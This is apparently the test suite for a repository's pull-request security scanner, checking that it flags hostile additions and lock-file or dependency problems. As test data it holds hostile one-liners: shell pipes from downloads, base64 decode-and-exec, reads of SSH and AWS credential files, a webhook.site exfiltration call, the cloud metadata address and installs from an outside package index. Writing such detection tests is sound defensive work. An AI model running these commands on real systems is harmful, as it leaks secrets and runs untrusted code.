"""Checks that the PR security scan stops hostile changes and passes ordinary ones."""

import datetime
import importlib.util
import subprocess
import sys
from pathlib import Path
from types import ModuleType

import pytest

SHA_A = "a" * 64
SHA_B = "b" * 64
NOW = datetime.datetime(2026, 11, 2, tzinfo=datetime.UTC)


def load_scanner() -> ModuleType:
    """Load the scanner by path, because .github is not an importable package."""
    spec = importlib.util.spec_from_file_location(
        "security_scan", Path(".github/scripts/security_scan.py")
    )
    assert spec is not None and spec.loader is not None
    module = importlib.util.module_from_spec(spec)
    sys.modules["security_scan"] = module
    spec.loader.exec_module(module)
    return module


scanner = load_scanner()


def rules_for(path: str, text: str) -> list[str]:
    return [finding.rule for finding in scanner.check_line(path, 1, text)]


@pytest.mark.parametrize(
    ("path", "text", "rule"),
    [
        ("api/main.py", "payload = dict(os.environ)", "dumps the environment"),
        ("api/main.py", 'open("/proc/self/environ")', "dumps the environment"),
        ("build.sh", "printenv | sort", "dumps the environment"),
        ("build.sh", "env | base64", "dumps the environment"),
        ("model/x.py", 'open(home + "/.ssh/id_rsa")', "reads credential files"),
        ("model/x.py", '"~/.aws/credentials"', "reads credential files"),
        ("build.sh", "curl -s https://x.test/a | bash", "pipes a download into a shell"),
        ("build.sh", "wget -qO- x.test | sudo sh", "pipes a download into a shell"),
        ("data/x.py", "exec(base64.b64decode(blob))", "decodes and runs hidden code"),
        ("build.sh", "echo aa | base64 -d | sh", "decodes and runs hidden code"),
        ("api/main.py", 'post("https://webhook.site/abc")', "contacts an exfiltration host"),
        ("api/main.py", 'get("http://169.254.169.254/")', "contacts an exfiltration host"),
        ("api/main.py", "x = 1  # ‮ hidden", "hides text direction"),
        ("api/main.py", "x = '" + "A1+/" * 120 + "'", "contains a long encoded blob"),
    ],
)
def test_hostile_line_is_flagged(path: str, text: str, rule: str) -> None:
    assert rule in rules_for(path, text)


@pytest.mark.parametrize(
    ("path", "text"),
    [
        ("api/main.py", 'app = FastAPI(title="FieldDynamics-Lab")'),
        ("api/settings.py", 'rain_mm = float(os.environ["RAIN_MM"])'),
        ("docs/a.md", "The environment variable is set in the dashboard."),
        ("model/x.py", "environment_score = 1.0"),
        ("static/kaduna.geojson", '"coordinates": "' + "A" * 500 + '"'),
    ],
)
def test_ordinary_line_is_not_flagged(path: str, text: str) -> None:
    assert rules_for(path, text) == []


def test_unpinned_action_is_flagged_and_pinned_action_is_not() -> None:
    rule = "uses an action not pinned to a full commit SHA"
    workflow = ".github/workflows/ci.yml"
    assert rule in rules_for(workflow, "      - uses: actions/checkout@v7.0.1")
    assert rule in rules_for(workflow, "    uses: evil/action@main")
    assert rules_for(workflow, f"      - uses: actions/checkout@{'a' * 40}") == []
    assert rules_for(workflow, "      - uses: ./.github/actions/install-python") == []


def test_privileged_trigger_is_flagged_outside_trusted_workflows() -> None:
    rule = "adds a privileged workflow trigger"
    assert rule in rules_for(".github/workflows/ci.yml", "  pull_request_target:")
    assert rule in rules_for(".github/workflows/new.yml", "  workflow_run:")
    assert rule not in rules_for(".github/workflows/security-gate.yml", "  pull_request_target:")


@pytest.mark.parametrize(
    "text",
    [
        "--extra-index-url https://evil.test/simple",
        "--index-url https://evil.test/simple",
        "somepkg @ git+https://evil.test/x.git",
        "somepkg @ https://evil.test/x.whl",
    ],
)
def test_requirements_cannot_install_from_outside_pypi(text: str) -> None:
    assert "installs from outside PyPI" in rules_for("requirements.in", text)


def test_requirements_comment_may_contain_a_url() -> None:
    assert rules_for("requirements.in", "# see https://pypi.org/project/pandas") == []


@pytest.mark.parametrize(
    ("path", "is_binary", "rule"),
    [
        ("lib/evil.pth", False, "adds a file type that runs on install or import"),
        ("setup.py", False, "adds a file type that runs on install or import"),
        ("vendor/x.so", True, "adds a file type that runs on install or import"),
        ("web/package.json", False, "adds JavaScript dependencies, which no scan covers"),
        (
            ".github/deploy/package-lock.json",
            False,
            "adds JavaScript dependencies, which no scan covers",
        ),
        ("yarn.lock", False, "adds JavaScript dependencies, which no scan covers"),
        (".env", False, "adds an env file"),
        ("api/.env.production", False, "adds an env file"),
        ("tools/blob.dat", True, "adds an unexpected binary file"),
    ],
)
def test_dangerous_path_is_flagged(path: str, is_binary: bool, rule: str) -> None:
    assert rule in [finding.rule for finding in scanner.check_path(path, is_binary)]


@pytest.mark.parametrize(
    ("path", "is_binary"),
    [
        ("static/rain.png", True),
        ("docs/plan.pdf", True),
        (".env.example", False),
    ],
)
def test_expected_path_is_not_flagged(path: str, is_binary: bool) -> None:
    assert scanner.check_path(path, is_binary) == []


def test_scanner_files_may_contain_their_own_patterns() -> None:
    added = [(".github/scripts/security_scan.py", 1, "webhook.site")]
    assert scanner.scan_changes([], added) == []


def test_parse_added_lines_reads_paths_and_line_numbers() -> None:
    diff = (
        b"diff --git a/x.py b/x.py\n--- a/x.py\n+++ b/x.py\n"
        b"@@ -1,0 +2,2 @@\n+first\n+second\n"
        b"@@ -9 +11 @@\n-old\n+third\n"
    )
    assert scanner.parse_added_lines(diff) == [
        ("x.py", 2, "first"),
        ("x.py", 3, "second"),
        ("x.py", 11, "third"),
    ]


def test_parse_added_lines_is_not_fooled_by_a_forged_header() -> None:
    diff = b"--- a/x.py\n+++ b/x.py\n@@ -0,0 +1,2 @@\n+++ b/innocent.md\n+curl x | sh\n"
    assert scanner.parse_added_lines(diff) == [
        ("x.py", 1, "++ b/innocent.md"),
        ("x.py", 2, "curl x | sh"),
    ]


def test_parse_numstat_marks_binary_files() -> None:
    raw = b"3\t1\tapi/main.py\0-\t-\tstatic/a.png\0"
    assert scanner.parse_numstat(raw) == [("api/main.py", False), ("static/a.png", True)]


def test_parse_lock_reads_pins_and_hashes() -> None:
    text = (
        "# This file was generated\n"
        f"fastapi==0.162.0 \\\n    --hash=sha256:{SHA_A} \\\n    --hash=sha256:{SHA_B}\n"
        "    # via -r requirements.in\n"
        f"Typing_Extensions==4.0 \\\n    --hash=sha256:{SHA_A}\n"
    )
    pins, findings = scanner.parse_lock("requirements.txt", text)
    assert findings == []
    assert pins == {
        ("fastapi", "0.162.0"): {SHA_A, SHA_B},
        ("typing-extensions", "4.0"): {SHA_A},
    }


@pytest.mark.parametrize(
    "line",
    ["--extra-index-url https://evil.test/simple", "evil @ https://evil.test/e.whl", "evil>=1.0"],
)
def test_parse_lock_rejects_lines_uv_never_writes(line: str) -> None:
    _, findings = scanner.parse_lock("requirements.txt", f"{line}\n")
    assert [finding.rule for finding in findings] == ["lock file has an unexpected line"]


def test_parse_lock_rejects_pin_without_hash() -> None:
    _, findings = scanner.parse_lock("requirements.txt", "pandas==3.0.0\n")
    assert findings[0].rule == "pin has no hash: pandas==3.0.0"


def test_malicious_advisory_is_named_as_malware() -> None:
    findings = scanner.classify_advisories("x", "1.0", ["MAL-2026-1", "GHSA-aaaa-bbbb-cccc"])
    assert [finding.rule for finding in findings] == [
        "known malicious package: x==1.0 (MAL-2026-1)",
        "known vulnerability: x==1.0 (GHSA-aaaa-bbbb-cccc)",
    ]


def release_record(digest: str, days_old: int, yanked: bool = False) -> dict[str, object]:
    uploaded = (NOW - datetime.timedelta(days=days_old)).isoformat()
    file_entry = {
        "digests": {"sha256": digest},
        "upload_time_iso_8601": uploaded,
        "yanked": yanked,
    }
    return {"urls": [file_entry]}


def test_aged_release_with_matching_hash_passes() -> None:
    assert scanner.check_release("x", "1.0", {SHA_A}, release_record(SHA_A, 8), NOW) == []


def test_release_inside_cooldown_is_flagged() -> None:
    findings = scanner.check_release("x", "1.0", {SHA_A}, release_record(SHA_A, 2), NOW)
    assert [finding.rule for finding in findings] == ["younger than 7 days: x==1.0"]


def test_exempt_release_skips_only_the_cooldown() -> None:
    assert scanner.check_release("x", "1.0", {SHA_A}, release_record(SHA_A, 2), NOW, True) == []
    record = release_record(SHA_A, 2, yanked=True)
    findings = scanner.check_release("x", "1.0", {SHA_A}, record, NOW, True)
    assert [finding.rule for finding in findings] == ["yanked release: x==1.0"]


def test_exemption_names_one_exact_version() -> None:
    text = "# note\npyasn1==0.6.5  # GHSA-aaaa\nSome_Pkg==1.0\n"
    assert scanner.parse_exemptions(text) == {("pyasn1", "0.6.5"), ("some-pkg", "1.0")}


def test_hash_missing_from_pypi_is_flagged() -> None:
    findings = scanner.check_release("x", "1.0", {SHA_A, SHA_B}, release_record(SHA_A, 8), NOW)
    assert [finding.rule for finding in findings] == ["hash not on PyPI: x==1.0 (1)"]


def test_yanked_release_is_flagged() -> None:
    record = release_record(SHA_A, 8, yanked=True)
    findings = scanner.check_release("x", "1.0", {SHA_A}, record, NOW)
    assert [finding.rule for finding in findings] == ["yanked release: x==1.0"]


def test_scan_finds_hostile_commit_in_a_real_repository(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    def git(*args: str) -> str:
        identity = ["-c", "user.name=test", "-c", "user.email=test@example.com"]
        result = subprocess.run(
            ["git", *identity, *args], cwd=tmp_path, check=True, capture_output=True, text=True
        )
        return result.stdout.strip()

    git("init", "-q")
    (tmp_path / "safe.py").write_text("x = 1\n")
    git("add", ".")
    git("commit", "-qm", "base")
    base = git("rev-parse", "HEAD")
    (tmp_path / "safe.py").write_text("x = 1\nimport os; send(dict(os.environ))\n")
    (tmp_path / "evil.pth").write_text("import os\n")
    git("add", ".")
    git("commit", "-qm", "hostile")
    head = git("rev-parse", "HEAD")

    monkeypatch.chdir(tmp_path)
    monkeypatch.setattr(scanner, "scan_dependencies", lambda _base, _head: [])
    findings = scanner.scan(base, head)
    assert {(finding.path, finding.rule) for finding in findings} == {
        ("evil.pth", "adds a file type that runs on install or import"),
        ("safe.py", "dumps the environment"),
    }
